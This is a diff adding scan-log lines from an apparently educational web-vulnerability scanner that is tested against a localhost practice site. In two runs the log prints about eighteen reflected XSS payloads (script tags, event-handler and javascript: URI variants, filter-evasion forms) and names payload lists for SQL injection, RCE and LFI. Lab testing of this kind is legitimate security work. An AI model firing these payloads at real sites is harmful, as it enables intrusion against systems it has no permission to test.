@@ -2299,3 +2299,240 @@
 2025-11-13 22:33:23,639 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=post)
 2025-11-13 22:33:24,683 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/login.php (method=post)
 2025-11-13 22:33:26,223 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T170326Z.json', 'csv': 'reports\\edu_scan_report_20251113T170326Z.csv', 'html': 'reports\\edu_scan_report_20251113T170326Z.html', 'pdf': 'reports\\edu_scan_report_20251113T170326Z.pdf'}
+2025-11-13 23:03:23,167 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:03:23,167 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:03:23,167 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:03:23,167 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:03:23,167 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:03:23,167 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:03:23,167 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:03:23,167 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:03:32,342 INFO: Crawled: http://localhost/testwebsite/vulnauth/login.php (total 1)
+2025-11-13 23:03:34,939 INFO: Starting stored-XSS checks (this will submit data to forms). Run only with permission.
+2025-11-13 23:03:35,488 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/login.php (method=post)
+2025-11-13 23:03:36,507 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T173336Z.json', 'csv': 'reports\\edu_scan_report_20251113T173336Z.csv', 'html': 'reports\\edu_scan_report_20251113T173336Z.html', 'pdf': 'reports\\edu_scan_report_20251113T173336Z.pdf'}
+2025-11-13 23:07:07,334 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:07:07,334 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:07:07,334 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:07:07,334 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:07:07,334 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:07:07,334 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:07:07,334 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:07:07,334 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:07:17,943 INFO: Crawled: http://localhost/testwebsite/vulnauth/login.php (total 1)
+2025-11-13 23:07:20,515 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:07:21,627 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:07:22,176 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/login.php (method=post)
+2025-11-13 23:07:23,243 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T173723Z.json', 'csv': 'reports\\edu_scan_report_20251113T173723Z.csv', 'html': 'reports\\edu_scan_report_20251113T173723Z.html', 'pdf': 'reports\\edu_scan_report_20251113T173723Z.pdf'}
+2025-11-13 23:07:33,125 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:07:33,125 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:07:33,125 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:07:33,125 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:07:33,125 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:07:33,125 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:07:33,125 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:07:33,125 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:07:36,520 INFO: Crawled: http://localhost/testwebsite/vulnauth/login.php (total 1)
+2025-11-13 23:07:39,103 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:07:40,272 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:07:40,803 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/login.php (method=post)
+2025-11-13 23:07:41,838 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T173741Z.json', 'csv': 'reports\\edu_scan_report_20251113T173741Z.csv', 'html': 'reports\\edu_scan_report_20251113T173741Z.html', 'pdf': 'reports\\edu_scan_report_20251113T173741Z.pdf'}
+2025-11-13 23:07:59,233 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:07:59,233 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:07:59,233 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:07:59,233 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:07:59,233 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:07:59,233 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:07:59,233 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:07:59,233 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:08:08,948 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:08:08,948 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:08:08,948 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:08:08,948 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:08:08,948 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:08:08,948 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:08:08,948 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:08:08,948 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:08:11,594 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:08:14,254 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:08:17,354 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:08:17,941 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=get)
+2025-11-13 23:08:18,651 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=get)
+2025-11-13 23:08:19,160 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=post)
+2025-11-13 23:08:20,215 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T173820Z.json', 'csv': 'reports\\edu_scan_report_20251113T173820Z.csv', 'html': 'reports\\edu_scan_report_20251113T173820Z.html', 'pdf': 'reports\\edu_scan_report_20251113T173820Z.pdf'}
+2025-11-13 23:09:07,027 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:09:07,027 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:09:07,027 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:09:07,027 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:09:07,027 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:09:07,027 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:09:07,027 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:09:07,027 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:09:10,713 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:09:10,713 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:09:10,713 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:09:10,713 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:09:10,713 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:09:10,713 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:09:10,713 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:09:10,713 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:09:14,494 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:09:17,111 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:09:20,082 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:09:20,654 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=get)
+2025-11-13 23:09:21,325 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=get)
+2025-11-13 23:09:21,838 INFO: [Stored-XSS] Injected payload into http://localhost/testwebsite/vulnauth/welcome.php (method=post)
+2025-11-13 23:09:22,862 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T173922Z.json', 'csv': 'reports\\edu_scan_report_20251113T173922Z.csv', 'html': 'reports\\edu_scan_report_20251113T173922Z.html', 'pdf': 'reports\\edu_scan_report_20251113T173922Z.pdf'}
+2025-11-13 23:10:44,564 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:10:44,565 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:10:44,565 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:10:44,565 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:10:44,566 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:10:44,566 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:10:44,566 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:10:44,566 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:10:47,657 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:10:50,299 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:10:53,299 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:10:54,587 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T174054Z.json', 'csv': 'reports\\edu_scan_report_20251113T174054Z.csv', 'html': 'reports\\edu_scan_report_20251113T174054Z.html', 'pdf': 'reports\\edu_scan_report_20251113T174054Z.pdf'}
+2025-11-13 23:14:34,562 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:14:34,562 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:14:34,562 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:14:34,562 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:14:34,562 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:14:34,562 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:14:34,562 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:14:34,562 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:16:00,737 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:16:00,737 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:16:00,737 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:16:00,737 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:16:00,737 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:16:00,737 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:16:00,737 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:16:00,737 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:16:04,712 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:16:07,349 INFO: Testing reflected XSS on pages without parameters...
+2025-11-13 23:16:17,316 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:16:20,346 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:16:21,654 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T174621Z.json', 'csv': 'reports\\edu_scan_report_20251113T174621Z.csv', 'html': 'reports\\edu_scan_report_20251113T174621Z.html', 'pdf': 'reports\\edu_scan_report_20251113T174621Z.pdf'}
+2025-11-13 23:17:56,750 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:17:56,750 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:17:56,750 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:17:56,750 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:17:56,750 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:17:56,750 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:17:56,750 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:17:56,750 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:18:00,827 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:18:00,827 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:18:00,827 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:18:00,827 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:18:00,827 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:18:00,827 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:18:00,827 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:18:00,827 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:18:03,287 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:18:05,953 INFO: Testing reflected XSS on pages without parameters...
+2025-11-13 23:18:15,891 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:18:18,937 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:18:20,283 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T174820Z.json', 'csv': 'reports\\edu_scan_report_20251113T174820Z.csv', 'html': 'reports\\edu_scan_report_20251113T174820Z.html', 'pdf': 'reports\\edu_scan_report_20251113T174820Z.pdf'}
+2025-11-13 23:23:27,951 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:23:27,951 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:23:27,951 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:23:27,951 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:23:27,951 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:23:27,951 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:23:27,951 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:23:27,951 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:23:31,841 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:23:31,841 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:23:31,841 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:23:31,841 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:23:31,841 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:23:31,841 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:23:31,841 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:23:31,841 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:23:34,286 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:23:36,928 INFO: Testing reflected XSS on pages without parameters...
+2025-11-13 23:23:37,453 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>alert(1)</script>
+2025-11-13 23:23:37,988 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror=alert(1)>
+2025-11-13 23:23:38,518 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg/onload=alert(1)>
+2025-11-13 23:23:39,589 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><iframe/src=javascript:alert(1)>
+2025-11-13 23:23:40,122 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><body onload=alert(1)>
+2025-11-13 23:23:40,654 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>confirm(1)</script>
+2025-11-13 23:23:41,185 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>prompt(1)</script>
+2025-11-13 23:23:41,721 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><scr<script>ipt>alert(1)</scr<script>ipt>
+2025-11-13 23:23:42,255 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror="this.src='x';alert(1)">
+2025-11-13 23:23:42,787 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x=<script>alert(document.domain)</script>
+2025-11-13 23:23:43,322 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg><script>alert(1)</script>
+2025-11-13 23:23:43,855 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><details/open ontoggle=alert(1)>
+2025-11-13 23:23:44,387 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><a href="javascript:alert(1)">click</a>
+2025-11-13 23:23:44,918 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x=</script><script>alert(1)</script>
+2025-11-13 23:23:45,454 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><video src onerror=alert(1)>
+2025-11-13 23:23:45,987 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><audio src onerror=alert(1)>
+2025-11-13 23:23:46,520 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><marquee onstart=alert(1)>
+2025-11-13 23:23:47,050 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><math><mtext><mglyph onload=alert(1)>
+2025-11-13 23:23:47,052 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:23:50,117 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:23:51,500 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T175351Z.json', 'csv': 'reports\\edu_scan_report_20251113T175351Z.csv', 'html': 'reports\\edu_scan_report_20251113T175351Z.html', 'pdf': 'reports\\edu_scan_report_20251113T175351Z.pdf'}
+2025-11-13 23:24:51,364 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:24:51,364 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:24:51,364 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:24:51,364 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:24:51,364 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:24:51,364 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:24:51,364 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:24:51,364 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:24:55,266 INFO: Crawled: http://localhost/testwebsite/vulnauth/welcome.php (total 1)
+2025-11-13 23:24:57,936 INFO: Testing reflected XSS on pages without parameters...
+2025-11-13 23:24:58,469 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>alert(1)</script>
+2025-11-13 23:24:59,000 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror=alert(1)>
+2025-11-13 23:24:59,534 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg/onload=alert(1)>
+2025-11-13 23:25:00,569 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><iframe/src=javascript:alert(1)>
+2025-11-13 23:25:01,073 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><body onload=alert(1)>
+2025-11-13 23:25:01,601 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>confirm(1)</script>
+2025-11-13 23:25:02,134 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><script>prompt(1)</script>
+2025-11-13 23:25:02,672 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><scr<script>ipt>alert(1)</scr<script>ipt>
+2025-11-13 23:25:03,203 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><img src=x onerror="this.src='x';alert(1)">
+2025-11-13 23:25:03,738 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x=<script>alert(document.domain)</script>
+2025-11-13 23:25:04,272 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><svg><script>alert(1)</script>
+2025-11-13 23:25:04,801 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><details/open ontoggle=alert(1)>
+2025-11-13 23:25:05,337 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><a href="javascript:alert(1)">click</a>
+2025-11-13 23:25:05,869 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x=</script><script>alert(1)</script>
+2025-11-13 23:25:06,404 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><video src onerror=alert(1)>
+2025-11-13 23:25:06,934 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><audio src onerror=alert(1)>
+2025-11-13 23:25:07,468 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><marquee onstart=alert(1)>
+2025-11-13 23:25:08,003 INFO: [XSS-REFLECT-AUTO] payload reflected @ http://localhost/testwebsite/vulnauth/welcome.php?x="><math><mtext><mglyph onload=alert(1)>
+2025-11-13 23:25:08,003 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:25:11,092 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:25:12,379 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T175512Z.json', 'csv': 'reports\\edu_scan_report_20251113T175512Z.csv', 'html': 'reports\\edu_scan_report_20251113T175512Z.html', 'pdf': 'reports\\edu_scan_report_20251113T175512Z.pdf'}
+2025-11-13 23:25:24,505 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:25:24,505 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:25:24,505 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:25:24,505 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:25:24,505 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:25:24,505 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:25:24,505 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:25:24,505 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:25:36,657 INFO: Crawled: http://localhost/testwebsite/vulnauth/login.php (total 1)
+2025-11-13 23:25:39,258 INFO: Testing reflected XSS on pages without parameters...
+2025-11-13 23:25:49,224 INFO: Testing POST-based SQL injection across ALL pages...
+2025-11-13 23:25:50,497 INFO: Starting stored-XSS checks (this will submit data to forms).
+2025-11-13 23:25:51,550 INFO: Reports generated: {'json': 'reports\\edu_scan_report_20251113T175551Z.json', 'csv': 'reports\\edu_scan_report_20251113T175551Z.csv', 'html': 'reports\\edu_scan_report_20251113T175551Z.html', 'pdf': 'reports\\edu_scan_report_20251113T175551Z.pdf'}
+2025-11-13 23:36:34,916 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:36:34,916 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:36:34,916 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:36:34,916 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:36:34,916 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:36:34,916 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:36:34,916 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:36:34,916 INFO: Loaded 19 payloads from xss.txt
+2025-11-13 23:36:43,035 INFO: Loaded 13 payloads from fuzz_common.txt
+2025-11-13 23:36:43,035 INFO: Loaded 8 payloads from headers_attack.txt
+2025-11-13 23:36:43,035 INFO: Loaded 9 payloads from lfi_rfi.txt
+2025-11-13 23:36:43,035 INFO: Loaded 9 payloads from open_redirect.txt
+2025-11-13 23:36:43,035 INFO: Loaded 14 payloads from rce.txt
+2025-11-13 23:36:43,035 INFO: Loaded 25 payloads from sqli.txt
+2025-11-13 23:36:43,035 INFO: Loaded 11 payloads from ssti.txt
+2025-11-13 23:36:43,035 INFO: Loaded 19 payloads from xss.txt
